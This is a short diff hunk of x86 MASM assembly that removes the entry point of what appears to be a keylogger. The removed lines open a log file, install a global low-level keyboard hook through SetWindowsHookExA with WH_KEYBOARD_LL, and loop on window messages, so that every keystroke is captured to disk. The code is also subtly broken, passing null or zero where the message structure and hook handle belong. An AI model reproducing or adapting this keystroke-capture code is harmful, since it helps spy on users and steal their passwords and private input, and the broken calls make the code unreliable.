@@ -502,21 +502,3 @@ KeyboardProc PROC nCode:DWORD, wParam:DWORD, lParam:DWORD
     ret  
 KeyboardProc ENDP  
 
-start:   
- 
-    invoke CreateFileA, addr logfilePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL  
-    mov logfile, eax  
-    invoke SetFilePointer, logfile, 0, NULL, FILE_END  
-    invoke SetWindowsHookExA, WH_KEYBOARD_LL, addr KeyboardProc, NULL, NULL  
-
-    .WHILE TRUE  
-        invoke GetMessageA, NULL, 0, 0, 0  
-        invoke TranslateMessage, 0  
-        invoke DispatchMessageA, 0  
-    .ENDW  
-
-    invoke UnhookWindowsHookEx, 0  
-    invoke CloseHandle, logfile  
-    invoke ExitProcess, 0  
-
-end start
